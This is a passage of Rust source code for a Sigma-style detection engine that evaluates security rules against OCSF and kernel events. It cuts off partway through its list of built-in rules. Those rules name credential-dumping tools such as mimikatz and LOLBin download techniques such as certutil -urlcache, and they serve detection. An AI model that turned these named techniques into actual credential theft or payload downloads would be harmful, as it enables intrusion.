// Sigma-compatible detection rule engine.
// Evaluates structured detection rules against OCSF canonical events.
// ADR-0007: Sigma for detection authoring.

use serde::{Deserialize, Serialize};
use std::collections::HashMap;

use crate::ocsf::{OcsfData, OcsfEvent};

// ── Rule model ──────────────────────────────────────────────────

/// A detection rule modeled after Sigma specification.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SigmaRule {
    pub id: String,
    pub title: String,
    pub status: RuleStatus,
    pub level: SeverityLevel,
    pub description: String,
    /// Target log source category (process_creation, network_connection, dns_query, file_event, authentication, config_change, detection).
    pub logsource: LogSource,
    /// Detection logic: named conditions mapped to field matchers.
    pub detection: Detection,
    /// MITRE ATT&CK mapping.
    #[serde(default)]
    pub tags: Vec<String>,
    /// ATT&CK tactics and techniques.
    #[serde(default)]
    pub attack: Vec<AttackMapping>,
    /// False-positive context notes.
    #[serde(default)]
    pub falsepositives: Vec<String>,
    /// Suppression: minimum seconds between successive firings for same host.
    #[serde(default)]
    pub suppress_for_secs: u64,
    /// Rule enabled flag.
    #[serde(default = "default_true")]
    pub enabled: bool,
}

fn default_true() -> bool {
    true
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "lowercase")]
pub enum RuleStatus {
    Experimental,
    Test,
    Stable,
    Deprecated,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq, PartialOrd, Ord)]
#[serde(rename_all = "lowercase")]
pub enum SeverityLevel {
    Informational,
    Low,
    Medium,
    High,
    Critical,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LogSource {
    pub category: String,
    #[serde(default)]
    pub product: Option<String>,
    #[serde(default)]
    pub service: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Detection {
    /// Named selection conditions. All field matchers within a selection are ANDed.
    pub selections: HashMap<String, Vec<FieldMatcher>>,
    /// Optional filter (exclusion) conditions. If any filter matches, the detection is suppressed.
    #[serde(default)]
    pub filters: HashMap<String, Vec<FieldMatcher>>,
    /// Condition expression combining selections.
    /// Supported: "selection", "selection1 or selection2", "selection and not filter".
    pub condition: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FieldMatcher {
    pub field: String,
    pub modifier: MatchModifier,
    pub values: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "lowercase")]
pub enum MatchModifier {
    /// Exact match (case-insensitive).
    Equals,
    /// Substring contains (case-insensitive).
    Contains,
    /// Starts with (case-insensitive).
    StartsWith,
    /// Ends with (case-insensitive).
    EndsWith,
    /// Regex match.
    Re,
    /// Numeric greater-than.
    Gt,
    /// Numeric less-than.
    Lt,
    /// Field value exists / is not empty.
    Exists,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AttackMapping {
    pub tactic: String,
    pub technique_id: String,
    pub technique_name: String,
}

// ── Evaluation engine ───────────────────────────────────────────

/// Result of evaluating a rule against an event.
#[derive(Debug, Clone)]
pub struct RuleMatch {
    pub rule_id: String,
    pub rule_title: String,
    pub level: SeverityLevel,
    pub matched_fields: Vec<(String, String)>,
    pub attack: Vec<AttackMapping>,
}

/// Evaluates OCSF events against a set of Sigma rules.
pub struct SigmaEngine {
    rules: Vec<SigmaRule>,
    /// Per-rule per-host suppression tracker: rule_id:hostname -> last_fire_epoch.
    suppression: HashMap<String, u64>,
}

impl SigmaEngine {
    pub fn new() -> Self {
        Self {
            rules: Vec::new(),
            suppression: HashMap::new(),
        }
    }

    pub fn load_rules(&mut self, rules: Vec<SigmaRule>) {
        self.rules.extend(rules);
    }

    pub fn add_rule(&mut self, rule: SigmaRule) {
        self.rules.push(rule);
    }

    pub fn replace_rules(&mut self, rules: Vec<SigmaRule>) {
        self.rules = rules;
        self.suppression.clear();
    }

    pub fn rule_count(&self) -> usize {
        self.rules.len()
    }

    pub fn rules(&self) -> &[SigmaRule] {
        &self.rules
    }

    /// Access the suppression map (for kernel event bridge).
    pub fn suppression_map(&self) -> &HashMap<String, u64> {
        &self.suppression
    }

    /// Record a suppression entry (for kernel event bridge).
    pub fn record_suppression(&mut self, key: String, epoch: u64) {
        self.suppression.insert(key, epoch);
    }

    /// Evaluate all enabled rules against an OCSF event.
    /// Returns all matching rules.
    pub fn evaluate(&mut self, event: &OcsfEvent, now_epoch: u64) -> Vec<RuleMatch> {
        let fields = extract_fields(event);
        let hostname = fields.get("device.hostname").cloned().unwrap_or_default();
        let category = event_category(event);

        let mut matches = Vec::new();
        for rule in &self.rules {
            if !rule.enabled {
                continue;
            }
            if rule.logsource.category != category {
                continue;
            }

            // Suppression check
            if rule.suppress_for_secs > 0 {
                let key = format!("{}:{}", rule.id, hostname);
                if let Some(&last) = self.suppression.get(&key)
                    && now_epoch.saturating_sub(last) < rule.suppress_for_secs
                {
                    continue;
                }
            }

            if let Some(matched_fields) = evaluate_rule(rule, &fields) {
                // Record suppression
                if rule.suppress_for_secs > 0 {
                    let key = format!("{}:{}", rule.id, hostname);
                    self.suppression.insert(key, now_epoch);
                }
                matches.push(RuleMatch {
                    rule_id: rule.id.clone(),
                    rule_title: rule.title.clone(),
                    level: rule.level.clone(),
                    matched_fields,
                    attack: rule.attack.clone(),
                });
            }
        }
        matches
    }
}

impl Default for SigmaEngine {
    fn default() -> Self {
        Self::new()
    }
}

// ── SigmaHQ YAML Import ─────────────────────────────────────────────

/// Result of importing SigmaHQ rules from a directory.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SigmaImportResult {
    pub imported: usize,
    pub skipped: usize,
    pub errors: Vec<String>,
    pub rules: Vec<SigmaRule>,
}

/// Import Sigma rules from a directory of SigmaHQ-format YAML files.
///
/// Recursively scans the directory for .yml/.yaml files and parses them
/// into the internal SigmaRule format. SigmaHQ rules use a specific
/// YAML schema with `title`, `logsource`, `detection`, `level` etc.
pub fn import_sigmahq_directory(path: &str) -> SigmaImportResult {
    let mut result = SigmaImportResult {
        imported: 0,
        skipped: 0,
        errors: Vec::new(),
        rules: Vec::new(),
    };

    let entries = match std::fs::read_dir(path) {
        Ok(e) => e,
        Err(e) => {
            result.errors.push(format!("Failed to read directory {path}: {e}"));
            return result;
        }
    };

    for entry in entries.flatten() {
        let entry_path = entry.path();
        if entry_path.is_dir() {
            let sub = import_sigmahq_directory(entry_path.to_str().unwrap_or(""));
            result.imported += sub.imported;
            result.skipped += sub.skipped;
            result.errors.extend(sub.errors);
            result.rules.extend(sub.rules);
            continue;
        }

        let ext = entry_path.extension().and_then(|e| e.to_str()).unwrap_or("");
        if ext != "yml" && ext != "yaml" {
            continue;
        }

        let file_name = entry_path.to_str().unwrap_or("unknown").to_string();
        let content = match std::fs::read_to_string(&entry_path) {
            Ok(c) => c,
            Err(e) => {
                result.errors.push(format!("{file_name}: read error: {e}"));
                result.skipped += 1;
                continue;
            }
        };

        match parse_sigmahq_yaml(&content) {
            Ok(rule) => {
                result.rules.push(rule);
                result.imported += 1;
            }
            Err(e) => {
                result.errors.push(format!("{file_name}: {e}"));
                result.skipped += 1;
            }
        }
    }

    result
}

/// Parse a single SigmaHQ YAML file into a SigmaRule.
pub fn parse_sigmahq_yaml(yaml_content: &str) -> Result<SigmaRule, String> {
    // Simple YAML parser for SigmaHQ format
    let doc: serde_json::Value = parse_yaml_to_json(yaml_content)?;

    let id = doc
        .get("id")
        .and_then(|v| v.as_str())
        .unwrap_or("unknown")
        .to_string();
    let title = doc
        .get("title")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'title' field")?
        .to_string();
    let description = doc
        .get("description")
        .and_then(|v| v.as_str())
        .unwrap_or("")
        .to_string();
    let level = match doc
        .get("level")
        .and_then(|v| v.as_str())
        .unwrap_or("medium")
    {
        "informational" => SeverityLevel::Informational,
        "low" => SeverityLevel::Low,
        "medium" => SeverityLevel::Medium,
        "high" => SeverityLevel::High,
        "critical" => SeverityLevel::Critical,
        _ => SeverityLevel::Medium,
    };
    let status = match doc
        .get("status")
        .and_then(|v| v.as_str())
        .unwrap_or("experimental")
    {
        "stable" => RuleStatus::Stable,
        "test" => RuleStatus::Test,
        "deprecated" => RuleStatus::Deprecated,
        _ => RuleStatus::Experimental,
    };

    // Parse logsource
    let logsource_val = doc.get("logsource").ok_or("Missing 'logsource'")?;
    let logsource = LogSource {
        category: logsource_val
            .get("category")
            .and_then(|v| v.as_str())
            .unwrap_or("detection")
            .to_string(),
        product: logsource_val
            .get("product")
            .and_then(|v| v.as_str())
            .map(String::from),
        service: logsource_val
            .get("service")
            .and_then(|v| v.as_str())
            .map(String::from),
    };

    // Parse detection
    let detection_val = doc.get("detection").ok_or("Missing 'detection'")?;
    let condition = detection_val
        .get("condition")
        .and_then(|v| v.as_str())
        .unwrap_or("selection")
        .to_string();
    let mut selections = HashMap::new();
    let mut filters = HashMap::new();
    if let Some(obj) = detection_val.as_object() {
        for (key, val) in obj {
            if key == "condition" {
                continue;
            }
            let matchers = parse_sigma_detection_item(val);
            if key.starts_with("filter") {
                filters.insert(key.clone(), matchers);
            } else {
                selections.insert(key.clone(), matchers);
            }
        }
    }

    let detection = Detection {
        selections,
        filters,
        condition,
    };

    // Parse tags
    let tags: Vec<String> = doc
        .get("tags")
        .and_then(|v| v.as_array())
        .map(|arr| {
            arr.iter()
                .filter_map(|v| v.as_str().map(String::from))
                .collect()
        })
        .unwrap_or_default();

    // Parse ATT&CK from tags
    let attack: Vec<AttackMapping> = tags
        .iter()
        .filter(|t| t.starts_with("attack.t"))
        .map(|t| {
            let tech_id = t.strip_prefix("attack.").unwrap_or(t).to_uppercase();
            AttackMapping {
                tactic: String::new(),
                technique_id: tech_id.clone(),
                technique_name: tech_id,
            }
        })
        .collect();

    let falsepositives: Vec<String> = doc
        .get("falsepositives")
        .and_then(|v| v.as_array())
        .map(|arr| {
            arr.iter()
                .filter_map(|v| v.as_str().map(String::from))
                .collect()
        })
        .unwrap_or_default();

    Ok(SigmaRule {
        id,
        title,
        status,
        level,
        description,
        logsource,
        detection,
        tags,
        attack,
        falsepositives,
        suppress_for_secs: 0,
        enabled: true,
    })
}

fn parse_sigma_detection_item(val: &serde_json::Value) -> Vec<FieldMatcher> {
    let mut matchers = Vec::new();

    if let Some(obj) = val.as_object() {
        for (field, field_val) in obj {
            // Check for modifiers in field name: fieldname|modifier
            let (base_field, modifier) = if let Some((f, m)) = field.split_once('|') {
                let mod_type = match m {
                    "contains" => MatchModifier::Contains,
                    "startswith" => MatchModifier::StartsWith,
                    "endswith" => MatchModifier::EndsWith,
                    "re" => MatchModifier::Re,
                    _ => MatchModifier::Equals,
                };
                (f.to_string(), mod_type)
            } else {
                (field.clone(), MatchModifier::Equals)
            };

            let values = match field_val {
                serde_json::Value::Array(arr) => arr
                    .iter()
                    .filter_map(|v| match v {
                        serde_json::Value::String(s) => Some(s.clone()),
                        serde_json::Value::Number(n) => Some(n.to_string()),
                        _ => None,
                    })
                    .collect(),
                serde_json::Value::String(s) => vec![s.clone()],
                serde_json::Value::Number(n) => vec![n.to_string()],
                serde_json::Value::Bool(b) => vec![b.to_string()],
                _ => vec![],
            };

            matchers.push(FieldMatcher {
                field: base_field,
                modifier,
                values,
            });
        }
    } else if let Some(arr) = val.as_array() {
        // Array of detection items (OR within selection)
        for item in arr {
            matchers.extend(parse_sigma_detection_item(item));
        }
    }

    matchers
}

/// Minimal YAML-to-JSON parser for SigmaHQ format.
/// Handles the subset of YAML needed for Sigma rules: scalars, lists, maps.
fn parse_yaml_to_json(yaml: &str) -> Result<serde_json::Value, String> {
    // Use toml-compatible structure via line-by-line parsing
    let mut root = serde_json::Map::new();
    let mut current_key: Option<String> = None;
    let mut current_list: Option<Vec<serde_json::Value>> = None;
    let mut current_map: Option<serde_json::Map<String, serde_json::Value>> = None;
    let mut in_sub_map = false;
    let mut sub_key: Option<String> = None;

    for line in yaml.lines() {
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }

        let indent = line.len() - line.trim_start().len();

        if indent == 0 && trimmed.contains(':') && !trimmed.starts_with('-') {
            // Flush previous
            flush_current(&mut root, &mut current_key, &mut current_list, &mut current_map);
            in_sub_map = false;
            sub_key = None;

            let (key, val) = trimmed.split_once(':').unwrap();
            let key = key.trim().to_string();
            let val = val.trim();
            if val.is_empty() {
                current_key = Some(key);
                current_list = None;
                current_map = Some(serde_json::Map::new());
            } else {
                root.insert(key, parse_yaml_scalar(val));
            }
        } else if indent > 0 && trimmed.starts_with('-') {
            let val = trimmed.trim_start_matches('-').trim();
            if current_list.is_none() {
                current_list = Some(Vec::new());
                current_map = None;
            }
            if let Some(ref mut list) = current_list {
                list.push(parse_yaml_scalar(val));
            }
        } else if indent > 0 && trimmed.contains(':') && !trimmed.starts_with('-') {
            let (k, v) = trimmed.split_once(':').unwrap();
            let k = k.trim().to_string();
            let v = v.trim();

            if indent >= 8 && in_sub_map {
                // Nested map (e.g., detection selection fields)
                if let Some(ref mut map) = current_map {
                    if let Some(ref sk) = sub_key {
                        let sub = map.entry(sk.clone()).or_insert_with(|| serde_json::json!({}));
                        if let Some(obj) = sub.as_object_mut() {
                            obj.insert(k, parse_yaml_value(v));
                        }
                    }
                }
            } else if indent >= 4 {
                if v.is_empty() {
                    // Start of sub-map within current map
                    in_sub_map = true;
                    sub_key = Some(k.clone());
                    if let Some(ref mut map) = current_map {
                        map.insert(k, serde_json::json!({}));
                    }
                } else {
                    in_sub_map = false;
                    sub_key = None;
                    if let Some(ref mut map) = current_map {
                        map.insert(k, parse_yaml_value(v));
                    }
                }
            }
        }
    }

    flush_current(&mut root, &mut current_key, &mut current_list, &mut current_map);
    Ok(serde_json::Value::Object(root))
}

fn flush_current(
    root: &mut serde_json::Map<String, serde_json::Value>,
    key: &mut Option<String>,
    list: &mut Option<Vec<serde_json::Value>>,
    map: &mut Option<serde_json::Map<String, serde_json::Value>>,
) {
    if let Some(k) = key.take() {
        if let Some(l) = list.take() {
            root.insert(k, serde_json::Value::Array(l));
        } else if let Some(m) = map.take() {
            root.insert(k, serde_json::Value::Object(m));
        }
    }
    *list = None;
    *map = None;
}

fn parse_yaml_scalar(s: &str) -> serde_json::Value {
    let s = s.trim().trim_matches('\'').trim_matches('"');
    if s == "true" {
        serde_json::Value::Bool(true)
    } else if s == "false" {
        serde_json::Value::Bool(false)
    } else if let Ok(n) = s.parse::<i64>() {
        serde_json::json!(n)
    } else {
        serde_json::Value::String(s.to_string())
    }
}

fn parse_yaml_value(s: &str) -> serde_json::Value {
    let s = s.trim();
    if s.starts_with('[') && s.ends_with(']') {
        // Inline list: [val1, val2]
        let inner = &s[1..s.len() - 1];
        let items: Vec<serde_json::Value> = inner
            .split(',')
            .map(|item| parse_yaml_scalar(item.trim()))
            .collect();
        serde_json::Value::Array(items)
    } else {
        parse_yaml_scalar(s)
    }
}

/// Bridge: convert a `KernelEvent` into OCSF fields for Sigma evaluation.
/// Returns the extracted field map and the inferred logsource category.
pub fn kernel_event_to_sigma_fields(
    event: &crate::kernel_events::KernelEvent,
) -> (HashMap<String, String>, &'static str) {
    use crate::kernel_events::KernelEventKind;
    let mut f = HashMap::new();
    f.insert("device.hostname".into(), event.hostname.clone());

    let category = match &event.kind {
        KernelEventKind::ProcessExec {
            pid,
            ppid,
            exe,
            args,
            cwd,
            ..
        } => {
            f.insert("process.pid".into(), pid.to_string());
            f.insert("process.ppid".into(), ppid.to_string());
            // Derive process name from exe path
            let name = exe
                .rsplit('/')
                .next()
                .or_else(|| exe.rsplit('\\').next())
                .unwrap_or(exe);
            f.insert("process.name".into(), name.to_string());
            f.insert("process.file.path".into(), exe.clone());
            f.insert("process.file.name".into(), name.to_string());
            let cmd_line = if args.is_empty() {
                exe.clone()
            } else {
                format!("{} {}", exe, args.join(" "))
            };
            f.insert("process.cmd_line".into(), cmd_line);
            f.insert("actor.process.name".into(), "unknown".into());
            let _ = cwd; // available but not used in current rules
            "process_creation"
        }
        KernelEventKind::FileWrite {
            pid,
            path,
            bytes_written,
        } => {
            let name = path
                .rsplit('/')
                .next()
                .or_else(|| path.rsplit('\\').next())
                .unwrap_or(path);
            f.insert("file.path".into(), path.clone());
            f.insert("file.name".into(), name.to_string());
            f.insert("file.size".into(), bytes_written.to_string());
            f.insert("actor.process.name".into(), pid.to_string());
            "file_event"
        }
        KernelEventKind::FileDelete { path, .. }
        | KernelEventKind::FileRename { old_path: path, .. } => {
            let name = path
                .rsplit('/')
                .next()
                .or_else(|| path.rsplit('\\').next())
                .unwrap_or(path);
            f.insert("file.path".into(), path.clone());
            f.insert("file.name".into(), name.to_string());
            "file_event"
        }
        KernelEventKind::NetworkConnect {
            src_addr,
            src_port,
            dst_addr,
            dst_port,
            protocol,
            ..
        } => {
            f.insert("src.ip".into(), src_addr.clone());
            f.insert("src.port".into(), src_port.to_string());
            f.insert("dst.ip".into(), dst_addr.clone());
            f.insert("dst.port".into(), dst_port.to_string());
            f.insert("protocol".into(), protocol.clone());
            "network_connection"
        }
        KernelEventKind::DnsQuery {
            domain, query_type, ..
        } => {
            f.insert("query.hostname".into(), domain.clone());
            f.insert("query.type".into(), query_type.clone());
            "dns_query"
        }
        KernelEventKind::RegistryMutate {
            key,
            value_name,
            value_data,
            ..
        } => {
            f.insert("config_name".into(), key.clone());
            f.insert("config_type".into(), "registry".into());
            f.insert("new_value".into(), format!("{value_name}={value_data}"));
            "config_change"
        }
        _ => "detection",
    };
    (f, category)
}

/// Evaluate a `KernelEvent` directly against all loaded Sigma rules
/// without requiring an intermediate OCSF conversion.
pub fn evaluate_kernel_event(
    engine: &mut SigmaEngine,
    event: &crate::kernel_events::KernelEvent,
    now_epoch: u64,
) -> Vec<RuleMatch> {
    let (fields, category) = kernel_event_to_sigma_fields(event);
    let hostname = fields.get("device.hostname").cloned().unwrap_or_default();

    // Collect candidate rules first to avoid borrow conflict with suppression map
    let candidates: Vec<_> = engine
        .rules()
        .iter()
        .filter(|r| r.enabled && r.logsource.category == category)
        .cloned()
        .collect();

    let mut matches = Vec::new();
    for rule in &candidates {
        if let Some(matched_fields) = evaluate_rule(rule, &fields) {
            // Enforce suppression: skip if this rule fired recently for this host
            if rule.suppress_for_secs > 0 {
                let sup_key = format!("{}:{}", rule.id, hostname);
                if let Some(&last) = engine.suppression_map().get(&sup_key)
                    && now_epoch.saturating_sub(last) < rule.suppress_for_secs
                {
                    continue;
                }
                engine.record_suppression(sup_key, now_epoch);
            }
            matches.push(RuleMatch {
                rule_id: rule.id.clone(),
                rule_title: rule.title.clone(),
                level: rule.level.clone(),
                matched_fields,
                attack: rule.attack.clone(),
            });
        }
    }
    matches
}

/// Evaluate a single rule against extracted fields.
/// Returns Some(matched_fields) if rule fires, None otherwise.
fn evaluate_rule(
    rule: &SigmaRule,
    fields: &HashMap<String, String>,
) -> Option<Vec<(String, String)>> {
    let condition = &rule.detection.condition;
    let mut all_matched = Vec::new();

    // Parse the condition expression (simple subset)
    // Supports: "selection", "selection1 or selection2", "selection and not filter"
    let parts: Vec<&str> = condition.split_whitespace().collect();

    if parts.len() == 1 {
        // Simple: just one selection name
        let sel_name = parts[0];
        if let Some(matchers) = rule.detection.selections.get(sel_name) {
            let matched = evaluate_selection(matchers, fields)?;
            all_matched.extend(matched);
        } else {
            return None;
        }
    } else if parts.contains(&"or") {
        // OR logic between selections
        let mut any_matched = false;
        for part in &parts {
            if *part == "or" {
                continue;
            }
            if let Some(matchers) = rule.detection.selections.get(*part)
                && let Some(matched) = evaluate_selection(matchers, fields)
            {
                all_matched.extend(matched);
                any_matched = true;
            }
        }
        if !any_matched {
            return None;
        }
    } else if parts.contains(&"and") {
        // AND logic, with optional "not" for filters
        let mut i = 0;
        while i < parts.len() {
            if parts[i] == "and" {
                i += 1;
                continue;
            }
            if parts[i] == "not" {
                i += 1;
                if i < parts.len() {
                    // This is a filter name – if it matches, suppress
                    if let Some(matchers) = rule.detection.filters.get(parts[i]) {
                        if evaluate_selection(matchers, fields).is_some() {
                            return None; // Filter matched, suppress detection
                        }
                    } else if let Some(matchers) = rule.detection.selections.get(parts[i])
                        && evaluate_selection(matchers, fields).is_some()
                    {
                        return None;
                    }
                }
            } else {
                // Selection name
                if let Some(matchers) = rule.detection.selections.get(parts[i]) {
                    let matched = evaluate_selection(matchers, fields)?;
                    all_matched.extend(matched);
                } else {
                    return None;
                }
            }
            i += 1;
        }
    } else {
        // Fallback: try first word as selection
        if let Some(matchers) = rule.detection.selections.get(parts[0]) {
            let matched = evaluate_selection(matchers, fields)?;
            all_matched.extend(matched);
        } else {
            return None;
        }
    }

    Some(all_matched)
}

/// Evaluate a selection (all matchers must match = AND).
fn evaluate_selection(
    matchers: &[FieldMatcher],
    fields: &HashMap<String, String>,
) -> Option<Vec<(String, String)>> {
    let mut matched = Vec::new();
    for m in matchers {
        let field_val = fields.get(&m.field);
        let ok = match m.modifier {
            MatchModifier::Exists => field_val.is_some_and(|v| !v.is_empty()),
            MatchModifier::Equals => {
                field_val.is_some_and(|v| m.values.iter().any(|pat| v.eq_ignore_ascii_case(pat)))
            }
            MatchModifier::Contains => field_val.is_some_and(|v| {
                let vl = v.to_lowercase();
                m.values.iter().any(|pat| vl.contains(&pat.to_lowercase()))
            }),
            MatchModifier::StartsWith => field_val.is_some_and(|v| {
                let vl = v.to_lowercase();
                m.values
                    .iter()
                    .any(|pat| vl.starts_with(&pat.to_lowercase()))
            }),
            MatchModifier::EndsWith => field_val.is_some_and(|v| {
                let vl = v.to_lowercase();
                m.values.iter().any(|pat| vl.ends_with(&pat.to_lowercase()))
            }),
            MatchModifier::Re => {
                field_val.is_some_and(|v| {
                    m.values.iter().any(|pat| {
                        // Expand basic regex alternation: \\(a|b|c)\\ → check each alternative
                        if let Some(inner) = pat
                            .strip_prefix("\\\\(")
                            .and_then(|s| s.strip_suffix(")\\\\"))
                        {
                            inner.split('|').any(|alt| {
                                let needle = format!("\\{alt}\\");
                                v.contains(&needle)
                            })
                        } else if pat.contains('|') && pat.starts_with('(') && pat.ends_with(')') {
                            // Bare alternation group: (a|b|c)
                            let inner = &pat[1..pat.len() - 1];
                            inner.split('|').any(|alt| v.contains(alt))
                        } else {
                            // Plain substring match as fallback
                            v.contains(pat)
                        }
                    })
                })
            }
            MatchModifier::Gt => field_val.is_some_and(|v| {
                if let (Ok(fv), Some(Ok(tv))) =
                    (v.parse::<f64>(), m.values.first().map(|s| s.parse::<f64>()))
                {
                    fv > tv
                } else {
                    false
                }
            }),
            MatchModifier::Lt => field_val.is_some_and(|v| {
                if let (Ok(fv), Some(Ok(tv))) =
                    (v.parse::<f64>(), m.values.first().map(|s| s.parse::<f64>()))
                {
                    fv < tv
                } else {
                    false
                }
            }),
        };
        if !ok {
            return None;
        }
        if let Some(v) = field_val {
            matched.push((m.field.clone(), v.clone()));
        }
    }
    Some(matched)
}

// ── Field extraction from OCSF events ───────────────────────────

fn event_category(event: &OcsfEvent) -> &str {
    match &event.data {
        OcsfData::Process(_) => "process_creation",
        OcsfData::File(_) => "file_event",
        OcsfData::Network(_) => "network_connection",
        OcsfData::Dns(_) => "dns_query",
        OcsfData::Auth(_) => "authentication",
        OcsfData::Config(_) => "config_change",
        OcsfData::Detection(_) => "detection",
    }
}

fn extract_fields(event: &OcsfEvent) -> HashMap<String, String> {
    let mut f = HashMap::new();
    f.insert("class_uid".into(), event.class_uid.to_string());
    f.insert("severity_id".into(), event.severity_id.to_string());
    f.insert("time".into(), event.time.clone());

    match &event.data {
        OcsfData::Process(p) => {
            f.insert("process.name".into(), p.process.name.clone());
            f.insert("process.pid".into(), p.process.pid.to_string());
            if let Some(cmd) = &p.process.cmd_line {
                f.insert("process.cmd_line".into(), cmd.clone());
            }
            if let Some(ppid) = p.process.ppid {
                f.insert("process.ppid".into(), ppid.to_string());
            }
            if let Some(file) = &p.process.file {
                f.insert("process.file.path".into(), file.path.clone());
                f.insert("process.file.name".into(), file.name.clone());
            }
            f.insert("actor.process.name".into(), p.actor.process.name.clone());
            if let Some(cmd) = &p.actor.process.cmd_line {
                f.insert("actor.cmd_line".into(), cmd.clone());
            }
            if let Some(user) = &p.actor.user {
                f.insert("actor.user.name".into(), user.name.clone());
            }
            if let Some(pp) = &p.parent_process {
                f.insert("parent.name".into(), pp.name.clone());
                if let Some(cmd) = &pp.cmd_line {
                    f.insert("parent.cmd_line".into(), cmd.clone());
                }
            }
            f.insert("device.hostname".into(), p.device.hostname.clone());
            f.insert("device.os.name".into(), p.device.os.name.clone());
        }
        OcsfData::File(fe) => {
            f.insert("file.name".into(), fe.file.name.clone());
            f.insert("file.path".into(), fe.file.path.clone());
            if let Some(sz) = fe.file.size {
                f.insert("file.size".into(), sz.to_string());
            }
            f.insert("actor.process.name".into(), fe.actor.process.name.clone());
            f.insert("device.hostname".into(), fe.device.hostname.clone());
        }
        OcsfData::Network(ne) => {
            f.insert("src.ip".into(), ne.src_endpoint.ip.clone());
            f.insert("src.port".into(), ne.src_endpoint.port.to_string());
            f.insert("dst.ip".into(), ne.dst_endpoint.ip.clone());
            f.insert("dst.port".into(), ne.dst_endpoint.port.to_string());
            if let Some(h) = &ne.dst_endpoint.hostname {
                f.insert("dst.hostname".into(), h.clone());
            }
            if let Some(p) = &ne.protocol_name {
                f.insert("protocol".into(), p.clone());
            }
            if let Some(b) = ne.bytes_out {
                f.insert("bytes_out".into(), b.to_string());
            }
            f.insert("device.hostname".into(), ne.device.hostname.clone());
        }
        OcsfData::Dns(de) => {
            f.insert("query.hostname".into(), de.query.hostname.clone());
            f.insert("query.type".into(), de.query.query_type.clone());
            if let Some(r) = &de.rcode {
                f.insert("rcode".into(), r.clone());
            }
            f.insert("src.ip".into(), de.src_endpoint.ip.clone());
            f.insert("device.hostname".into(), de.device.hostname.clone());
        }
        OcsfData::Auth(ae) => {
            f.insert("user.name".into(), ae.user.name.clone());
            if let Some(d) = &ae.user.domain {
                f.insert("user.domain".into(), d.clone());
            }
            f.insert("status_id".into(), ae.status_id.to_string());
            f.insert("src.ip".into(), ae.src_endpoint.ip.clone());
            if let Some(lt) = &ae.logon_type {
                f.insert("logon_type".into(), lt.clone());
            }
            if let Some(ap) = &ae.auth_protocol {
                f.insert("auth_protocol".into(), ap.clone());
            }
            f.insert("device.hostname".into(), ae.device.hostname.clone());
        }
        OcsfData::Config(ce) => {
            f.insert("config_name".into(), ce.config_name.clone());
            f.insert("config_type".into(), ce.config_type.clone());
            if let Some(nv) = &ce.new_value {
                f.insert("new_value".into(), nv.clone());
            }
            if let Some(pv) = &ce.prev_value {
                f.insert("prev_value".into(), pv.clone());
            }
            f.insert("device.hostname".into(), ce.device.hostname.clone());
        }
        OcsfData::Detection(de) => {
            f.insert("finding.title".into(), de.finding.title.clone());
            f.insert("finding.severity".into(), de.finding.severity.clone());
            f.insert(
                "finding.confidence".into(),
                de.finding.confidence.to_string(),
            );
            f.insert("device.hostname".into(), de.device.hostname.clone());
        }
    }
    f
}

// ── Built-in detection rules ────────────────────────────────────

/// High-confidence detection rules (ADR-0007).
pub fn builtin_rules() -> Vec<SigmaRule> {
    vec![
        // 1. Suspicious shell spawned from web server
        SigmaRule {
            id: "SE-001".into(),
            title: "Shell Spawned from Web Server Process".into(),
            status: RuleStatus::Stable,
            level: SeverityLevel::High,
            description: "Detects shell processes spawned by web server parent processes".into(),
            logsource: LogSource { category: "process_creation".into(), product: None, service: None },
            detection: Detection {
                selections: HashMap::from([
                    ("selection".into(), vec![
                        FieldMatcher { field: "process.name".into(), modifier: MatchModifier::Equals, values: vec!["sh".into(), "bash".into(), "cmd.exe".into(), "powershell.exe".into(), "zsh".into()] },
                        FieldMatcher { field: "actor.process.name".into(), modifier: MatchModifier::Equals, values: vec!["nginx".into(), "httpd".into(), "apache2".into(), "w3wp.exe".into(), "node".into(), "java".into()] },
                    ]),
                ]),
                filters: HashMap::new(),
                condition: "selection".into(),
            },
            tags: vec!["attack.execution".into(), "attack.t1059".into()],
            attack: vec![AttackMapping { tactic: "Execution".into(), technique_id: "T1059".into(), technique_name: "Command and Scripting Interpreter".into() }],
            falsepositives: vec!["Legitimate CGI scripts".into()],
            suppress_for_secs: 300,
            enabled: true,
        },
        // 2. Credential dumping tool execution
        SigmaRule {
            id: "SE-002".into(),
            title: "Credential Dumping Tool Detected".into(),
            status: RuleStatus::Stable,
            level: SeverityLevel::Critical,
            description: "Detects execution of known credential dumping tools".into(),
            logsource: LogSource { category: "process_creation".into(), product: None, service: None },
            detection: Detection {
                selections: HashMap::from([
                    ("selection".into(), vec![
                        FieldMatcher { field: "process.name".into(), modifier: MatchModifier::Equals, values: vec!["mimikatz.exe".into(), "procdump.exe".into(), "gsecdump.exe".into(), "fgdump.exe".into(), "wce.exe".into()] },
                    ]),
                ]),
                filters: HashMap::new(),
                condition: "selection".into(),
            },
            tags: vec!["attack.credential_access".into(), "attack.t1003".into()],
            attack: vec![AttackMapping { tactic: "Credential Access".into(), technique_id: "T1003".into(), technique_name: "OS Credential Dumping".into() }],
            falsepositives: vec!["Authorized penetration testing".into()],
            suppress_for_secs: 0,
            enabled: true,
        },
        // 3. LOLBin usage for download
        SigmaRule {
            id: "SE-003".into(),
            title: "LOLBin Download Activity".into(),
            status: RuleStatus::Stable,
            level: SeverityLevel::High,
            description: "Detects living-off-the-land binaries used for download".into(),
            logsource: LogSource { category: "process_creation".into(), product: None, service: None },
            detection: Detection {
                selections: HashMap::from([
                    ("sel_certutil".into(), vec![
                        FieldMatcher { field: "process.name".into(), modifier: MatchModifier::Equals, values: vec!["certutil.exe".into()] },
                        FieldMatcher { field: "process.cmd_line".into(), modifier: MatchModifier::Contains, values: vec!["-urlcache".into(), "urlcache".into()] },
                    ]),
                    ("sel_bitsadmin".into(), vec![
